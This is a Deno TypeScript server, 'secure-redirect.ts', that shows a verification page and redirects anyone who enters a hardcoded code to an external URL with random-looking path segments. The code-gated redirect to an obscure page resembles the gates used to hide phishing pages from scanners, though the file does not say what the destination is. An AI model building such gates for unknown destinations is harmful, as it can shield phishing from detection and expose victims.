// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000"
};

// Keep your EXACT frontend HTML/CSS (unchanged from your approved version)
function generateHTML() {
  return `<!DOCTYPE html>...`; // Your entire approved HTML goes here
}

// Enhanced Request Handler
async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  // Handle verification (with robust error handling)
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      // 1. Parse JSON body safely
      let data;
      try {
        data = await req.json();
      } catch {
        return new Response(
          JSON.stringify({ message: "Invalid request format" }),
          { status: 400, headers: { "Content-Type": "application/json" } }
        );
      }

      // 2. Validate code exists
      if (!data.code || typeof data.code !== "string") {
        return new Response(
          JSON.stringify({ message: "Verification code required" }),
          { status: 400, headers: { "Content-Type": "application/json" } }
        );
      }

      // 3. Verify code (case-insensitive)
      if (data.code.trim().toUpperCase() === CONFIG.VERIFICATION_CODE.toUpperCase()) {
        return Response.redirect(CONFIG.DESTINATION_URL, 302);
      }

      // 4. Incorrect code
      return new Response(
        JSON.stringify({ message: "Invalid verification code" }),
        { status: 401, headers: { "Content-Type": "application/json" } }
      );

    } catch (err) {
      // 5. Server errors
      console.error("Verification error:", err);
      return new Response(
        JSON.stringify({ message: "Server error during verification" }),
        { status: 500, headers: { "Content-Type": "application/json" } }
      );
    }
  }

  // Serve verification page
  return new Response(generateHTML(), {
    headers: { 
      "Content-Type": "text/html",
      "Cache-Control": "no-cache" // Prevent stale content
    }
  });
}

// Start Server (with error handling)
try {
  console.log(`Server starting on port ${CONFIG.PORT}...`);
  await serve(handleRequest, { 
    port: Number(CONFIG.PORT),
    onListen: () => console.log("Server ready") 
  });
} catch (err) {
  console.error("Server failed to start:", err);
}